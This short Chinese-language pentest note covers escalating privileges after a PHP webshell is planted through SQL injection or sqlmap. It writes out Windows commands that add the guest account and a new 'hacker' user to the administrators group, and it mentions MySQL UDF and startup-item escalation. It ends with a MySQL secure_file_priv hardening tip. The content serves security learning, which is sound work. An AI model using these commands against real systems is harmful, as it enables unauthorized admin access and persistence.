通过手动或sqlmap写入一个phpwebshell文件的system()入口，

如果system()是高权限执行shell命令，直接加用户提权。
如果system()是低权限，利用mysql漏洞的UDF提取，启动项提权等。


^
Windows加用户进行提权：
```
whoami //当前登录用户

net user //列出系统中所有账户。

将guest用户加入管理员组
net localgroup administrators guest /add

创建一个用户hacker
net user hacker 123456 /add

将hacker用户加入管理员组，有远程登录权限。
net localgroup administrators hacker /add

登录hacker账户
runas /user:hacker "tsdiscon" 
tsdiscon 命令前往登录界面登录
或远程登录hacker账户


Windows默认同时只能登录一个账号,另一个下线。
Windows Server版，支持远程桌面多用户登陆。
linux支持远程多用户登录。
```

## **防御**
关闭可写文件，修改后需要重启mysql
```
--secure-file-priv = null  //任何不可读写
--secure-file-priv =        //任何可读写
--secure-file-priv = c:\   //只有C盘可读写
在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径读写文件
在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以读写文件
查看配置：
show variables like '%secure%';
```

